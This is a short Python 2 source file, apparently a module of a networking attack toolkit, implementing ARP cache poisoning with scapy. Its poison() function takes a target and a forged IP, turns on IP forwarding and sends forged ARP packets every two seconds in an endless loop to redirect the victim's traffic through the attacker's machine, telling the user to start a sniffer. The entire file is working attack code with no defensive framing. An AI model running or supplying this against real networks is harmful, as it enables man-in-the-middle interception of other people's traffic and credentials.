"""
    ARP Attacks module
"""

from scapy.all import get_if_addr, get_if_hwaddr, Ether, ARP, sendp, conf
import re, ip_misc, os, time

conf.verb = 0

#performs arp poisoning on the target's ip with a forged ip
def poison():
    iface = raw_input("Interface [eth0]:") or "eth0"
    target = raw_input("Enter target IP:")
    forged = raw_input("Enter fake IP:")
    if target != "" and forged != "" and ip_misc.check_IP(target) and ip_misc.check_IP(forged):
        try:
            mac = get_if_hwaddr(iface)
            my_ip = get_if_addr(iface)
            ip_misc.enable_forward()
            if mac != "00:00:00:00:00:00":
                #targeted attack (one machine's arp cache poisoned)
                packet = Ether()/ARP(op="who-has",hwsrc=mac,psrc=forged,pdst=target)
                print "Now poisoning and redirecting traffic... Start a sniffer to check!\nPress Ctrl+C to stop."
                try:
                    while True:
                        sendp(packet)
                        time.sleep(2)
                except KeyboardInterrupt:
                    ip_misc.disable_forward()
                return True
        except IOError:
            print "Wrong interface, check again."
            return False
